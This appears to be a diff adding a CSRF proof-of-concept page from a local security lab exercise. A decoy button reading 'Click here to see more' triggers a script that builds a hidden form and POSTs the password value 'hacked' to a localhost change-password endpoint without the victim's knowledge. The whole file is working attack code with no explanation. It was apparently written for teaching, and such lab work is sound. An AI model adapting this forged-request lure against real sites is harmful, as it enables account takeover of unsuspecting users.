@@ -1,0 +1,57 @@
+<!-- 
+<form name='change_pass' id="form-id" action='http://localhost/SecurityLab/vul_8_CSRF/vul_change_pass.php' method="post" target="_blank"> 
+-->
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript" src="http://w2ui.com/src/w2ui-1.4.2.min.js"></script>
+<link rel="stylesheet" type="text/css" href="http://w2ui.com/src/w2ui-1.4.2.min.css" />
+
+
+<form name='change_pass' id="form-id" method="post">
+
+<input type="password" hidden="hidden" class="form-control" name="password" placeholder="Password" value="hacked"/>
+<br>
+<button type="submit" onclick="post()"> <img src="http://i.imgur.com/irtkIvZ.jpg" /> <br><h2>Click here to see more</h2> </button>
+</form>
+
+
+<script type="text/javascript">
+var started;
+function showLightBox()
+{ 
+if (started) return;
+started = setTimeout(function(){
+    Lightbox.start(document.getElementById('firstImage'));
+    started;
+},500);
+}
+function stopShowLightBox(){
+if (started) {
+    clearTimeout(started)
+    started = 0;
+}
+}
+
+	
+function post() {
+
+    // The rest of this code assumes you are not using a library.
+    // It can be made less wordy if you use one.
+    var form = document.createElement("form");
+    form.setAttribute("method", "POST");
+    form.setAttribute("name", "change_pass");
+    form.setAttribute("action", "http://localhost/SecurityLab1/vul_8_CSRF/solved_apps/vul_change_pass.php");
+
+    var hiddenField = document.createElement("input");
+    hiddenField.setAttribute("type", "password");
+    hiddenField.setAttribute("hidden", "hidden");
+    hiddenField.setAttribute("name", "password");
+    hiddenField.setAttribute("value", "hacked");
+    form.appendChild(hiddenField);
+
+    document.body.appendChild(form);
+    form.submit();
+
+}
+
+</script>
